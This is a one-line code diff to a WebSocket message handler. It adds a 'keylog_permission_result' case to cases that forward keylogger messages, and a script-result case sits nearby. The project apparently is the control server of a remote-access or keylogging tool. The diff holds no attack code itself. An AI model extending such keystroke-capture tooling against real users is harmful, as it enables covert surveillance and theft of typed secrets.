@@ -726,6 +726,7 @@ export async function handleWebSocketMessage(
       case "keylog_file_content":
       case "keylog_clear_result":
       case "keylog_delete_result":
+      case "keylog_permission_result":
         deps.handleKeyloggerMessage(client.id, payload);
         break;
       case "script_result": {
